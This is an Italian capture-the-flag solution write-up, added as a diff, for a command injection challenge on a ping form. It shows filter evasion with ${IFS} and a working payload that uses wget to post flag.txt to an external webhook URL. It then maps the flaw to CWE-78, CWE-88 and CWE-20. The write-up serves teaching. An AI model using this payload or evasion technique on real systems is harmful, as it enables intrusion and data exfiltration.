@@ -1,0 +1,43 @@
+Soluzione
+Indagine Iniziale e Scoperta della Vulnerabilità
+
+Dopo aver individuato il campo hostname sulla pagina /ping, l'attaccante può intuire che l’applicazione esegue un comando di sistema ping sull’host indicato.
+Provando input standard come localhost, 127.0.0.1, e anche ;, &, oppure |, il giocatore può notare eventuali messaggi di errore o comportamenti inaspettati, che indicherebbero un tentativo di iniezione comandi.
+Individuazione del Filtro di Input
+
+Testando ulteriori combinazioni (ad esempio 127.0.0.1; ls o localhost | ls), l’attaccante potrebbe riscontrare errori come "Invalid input" se vengono rilevati simboli o termini proibiti.
+Tuttavia, una tecnica comune per evadere questi filtri è l’utilizzo della variabile ${IFS} (Internal Field Separator), che funge da sostituto dello spazio, evitando alcuni controlli sul carattere .
+Costruzione del Payload con ${IFS} per Bypassare i Filtri
+
+Con questa conoscenza, l’attaccante può costruire un payload per evadere i controlli e iniettare un comando di esfiltrazione. Ad esempio:
+localhost;wget${IFS}--post-file=./f''lag.txt${IFS}https://webhook.site/861d9027-0113-4569-a0f7-f2e1d0189425
+localhost;: esegue ping su localhost, poi chiude il comando ping.
+wget${IFS}--post-file=./f''lag.txt${IFS}https://webhook.site/861d9027-0113-4569-a0f7-f2e1d0189425: inietta un comando che invia il contenuto del file flag.txt a un URL controllato dall’attaccante.
+
+Iniezione del Payload e Recupero della Flag
+
+Inserire il payload nel campo hostname e inviarlo. Il server, vulnerabile alla command injection, eseguirà ping e poi wget, inviando il contenuto del file flag.txt all’indirizzo Webhook fornito.
+Accedere al server webhook per visualizzare la flag ricevuta.
+
+
+CWE-78: Command Injection
+
+La vulnerabilità di command injection si verifica quando l'applicazione non sanitizza correttamente l’input, permettendo l'esecuzione di comandi arbitrari.
+
+CWE-88: Argument Injection or Modification
+
+Manipolazione non autorizzata degli argomenti di comando, permettendo l'iniezione di comandi aggiuntivi come wget.
+
+CWE-20: Improper Input Validation
+
+Il server non valida adeguatamente l'input, permettendo il bypass del filtro tramite ${IFS}.
+
+
+1. Command Injection
+Questa vulnerabilità, nota come command injection, consente all'attaccante di eseguire comandi arbitrari su un sistema host attraverso l'inserimento di input malformato in un comando di sistema. Nel caso specifico, subprocess.Popen è configurato per eseguire un comando che include hostname direttamente da input dell’utente, senza un'adeguata sanificazione.
+
+2. Bypass dei Filtri
+I controlli implementati sono insufficienti perché possono essere aggirati utilizzando variabili speciali in shell, come ${IFS} (Internal Field Separator), che rappresenta lo spazio, consentendo di evitare l'uso diretto di spazi o caratteri proibiti. Questo metodo è una tecnica comune per evadere le blacklist di caratteri nei comandi di sistema.
+
+3. Metodo di Esfiltrazione
+L’attaccante utilizza wget per inviare il contenuto del file flag.txt a un server esterno, rappresentato qui da un URL webhook. Questo metodo è comune per l’esfiltrazione di dati e permette di ricevere contenuti in tempo reale nonostante le restrizioni di rete o di accesso.
